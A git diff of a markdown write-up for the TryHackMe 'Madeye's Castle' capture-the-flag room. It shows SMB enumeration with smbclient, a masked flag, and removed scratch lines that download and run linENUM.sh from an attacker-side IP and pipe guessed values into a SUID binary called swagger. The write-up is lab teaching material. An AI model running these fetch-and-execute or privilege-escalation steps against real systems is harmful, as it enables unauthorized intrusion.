@@ -2,6 +2,8 @@
 <h1><p align="center"> Madeye's Castle </p></h1>
 <h2><p align="center"> A boot2root box that is modified from a box used in CuCTF by the team at Runcode.ninja </p></h1>
 
+
+
 ### Room Link: [THM-Madeye's Castle](https://tryhackme.com/room/madeyescastle)
 
 So lets dive in...
@@ -48,7 +50,7 @@ Host script results:
 
 Nmap done: 1 IP address (1 host up) scanned in 53.17 seconds.
 ```
-We had smb port open lets explore that...
+We have smb port open lets explore that...
 ```bash
  smbclient -NL //10.10.50.42                                                                                                  1 ⨯
 
@@ -279,26 +281,3 @@ Guess my number: Nice use of the time-turner!
 This system architecture is RME{********************************}
 ```
 With this Madeye's Castle is Finished!!
-
-
-
-
-
-
-
-
-
-
-wget http://10.8.155.126/linENUM.sh && chmod +x linENUM.sh &&./linENUM
-
-/srv/time-turner/swagger | grep -oE '[^ ]+$' |tail -1 | /srv/time-turner/swagger|tee out
-
-echo '123' | /srv/time-turner/swagger | grep 'of' | awk -F 'of ' '{print $2}' | /srv/time-turner/swagger|tee out
-
-
-
-
-
-
-
-
